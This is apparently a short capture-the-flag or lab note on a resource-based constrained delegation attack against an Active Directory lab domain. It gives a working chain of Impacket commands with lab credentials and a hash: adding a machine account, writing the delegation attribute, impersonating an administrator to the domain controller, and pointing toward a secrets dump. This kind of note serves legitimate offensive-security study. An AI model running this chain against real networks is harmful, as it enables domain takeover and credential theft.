The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object.

![[Pasted image 20250521230619.png]]

Basically a RBCD attack.

Add a computer account if one is not available:

```bash
addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 10.10.233.37 -domain-netbios heron.vl 'heron.vl/adm_prju:ayDMWV929N9wAiB4'
```

Replace `FRAJMP$` with `ATTACKERSYSTEM$` if needed:

```bash
rbcd.py -delegate-from 'FRAJMP$' -delegate-to 'MUCDC$' -action 'write' 'heron.vl/adm_prju:ayDMWV929N9wAiB4'
```

Request service ticket (TGS) for a apecific SPN (Service Principal Name):

```bash
getST.py -spn 'cifs/MUCDC.heron.vl' -impersonate '_ADMIN' 'heron.v;/FRAJMP$' -hashes :6f55b3b443ef192c804b2ae98e8254f7 -dc-ip 10.10.233.37
```

Sets the Kerberos ticket cache environment variable:

```bash
export KRB5CCNAME=./_ADMIN.ccache
```

Run `secretsdump` or `netexec` etc....

